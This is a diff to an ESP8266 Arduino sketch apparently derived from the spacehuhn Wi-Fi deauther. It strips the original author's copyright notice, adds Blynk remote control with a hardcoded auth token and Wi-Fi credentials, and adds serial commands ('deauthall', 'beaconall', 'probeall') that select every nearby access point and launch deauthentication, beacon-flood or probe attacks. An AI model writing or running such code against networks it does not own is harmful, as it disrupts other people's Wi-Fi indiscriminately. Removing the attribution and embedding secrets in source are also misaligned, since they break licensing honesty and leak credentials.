@@ -1,10 +1,4 @@
 
-/*
-  ===========================================
-       Copyright (c) 2017 Stefan Kremser
-              github.com/spacehuhn
-  ===========================================
-*/
 
 #include <Arduino.h>
 
@@ -14,15 +8,19 @@
 #include <FS.h>
 #include <Wire.h> 
 #include <LiquidCrystal_I2C.h>
-LiquidCrystal_I2C lcd(0x27,20,4); 
+#include <BlynkSimpleEsp8266.h>
+#define resetPin 4 
 
-#define resetPin 4 /* <-- comment out or change if you need GPIO 4 for other purposes */
-//#define USE_DISPLAY /* <-- uncomment that if you want to use the display */
+char auth[] = "5afd6f4ba2c74dc9a3061ddf441a96f9";
+
+char ssid[] = "lol";
+char pass[] = "nope";
+
+LiquidCrystal_I2C lcd(0x27,20,4); 
 
 #ifdef USE_DISPLAY
   #include <Wire.h>
   
-  //include the library you need
   #include "SSD1306.h"
   //#include "SH1106.h"
   
@@ -31,15 +29,13 @@ LiquidCrystal_I2C lcd(0x27,20,4);
   #define downBtn D7
   #define selectBtn D5
   
-  #define buttonDelay 180 //delay in ms
+  #define buttonDelay 180 
   
   //render settings
   #define fontSize 8
   #define rowsPerSite 8
   
-  //create display(Adr, SDA-pin, SCL-pin)
   SSD1306 display(0x3c, D2, D1);
-  //SH1106 display(0x3c, D2, D1);
   
   int rows = 3;
   int curRow = 0;
@@ -69,9 +65,7 @@ ESP8266WebServer server(80);
 #include "Settings.h"
 #include "SSIDList.h"
 
-/* ========== DEBUG ========== */
 const bool debug = true;
-/* ========== DEBUG ========== */
 
 NameList nameList;
 
@@ -434,7 +428,8 @@ void setup() {
   lcd.setCursor ( 0, 3 );            // go to the fourth row
   lcd.print("+    PLAYGROUND    +");
   if(debug) Serial.println("\nPrint complete. Initialization core functionalities...\n");
-  
+  if(debug) Serial.println("Initializing Blynk");
+  Blynk.begin(auth, ssid, pass);
 #ifdef USE_DISPLAY
   display.init();
   display.setFont(Roboto_Mono_8);
@@ -522,6 +517,7 @@ void setup() {
 }
 
 void loop() {
+  Blynk.run();
   if (clientScan.sniffing) {
     if (clientScan.stop()) startWifi();
   } else {
@@ -543,7 +539,7 @@ void loop() {
     if(input == "scan"){
       startAPScan();
     }
-  if(input == "attackall"){
+  if(input == "deauthall"){
     Serial.println("Scanning all presented APs...");
   startAPScan();
     Serial.println("Done.\n");
@@ -564,6 +560,39 @@ void loop() {
     Serial.println("Stopped.");
     
     }
+  
+  if(input == "beaconall"){
+    Serial.println("Scanning all presented APs...");
+  startAPScan();
+    Serial.println("Done.\n");
+  
+    Serial.println("Setting targets...");
+    apScan.selectall();
+    Serial.println("Done.\n");
+  
+    Serial.println("Starting beacon attack...");
+    Serial.println("\n**********input 'stop' to stop attack***********\n");
+    delay(2000);
+    //attack.attacksNames = 1
+    startAttack();
+    attack.start(1);
+  }
+  if(input == "probeall"){
+    Serial.println("Scanning all presented APs...");
+  startAPScan();
+    Serial.println("Done.\n");
+  
+    Serial.println("Setting targets...");
+    apScan.selectall();
+    Serial.println("Done.\n");
+  
+    Serial.println("Starting probe attack...");
+    Serial.println("\n**********input 'stop' to stop attack***********\n");
+    delay(2000);
+    //attack.attacksNames = 1
+    startAttack();
+    attack.start(2);
+  }
   }
 
 
